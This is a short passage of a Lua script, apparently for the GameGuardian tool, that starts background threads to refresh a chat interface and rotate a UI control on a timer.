local runnable = luajava.getRunnable(invoke2)
local handler = luajava.getHandler()
handler:post(runnable)
function nth(t)
luajava.newThread(t):start()
end
luajava.newThread(function()--更新逻辑
while true do
gg.sleep(3000)
if 显示==0 then
proo()
end
end
end):start()
luajava.newThread(function()--更新逻辑
while true do
gg.sleep(1000)
if already==true and 当前ui==4 then
pcall(shuaxinchat())
end
end
end):start()
pcall(shuaxinchat())
function proo()
changan.controlRotation2(control1,3000)
end

bloc = luajava.getBlock()
bloc('join')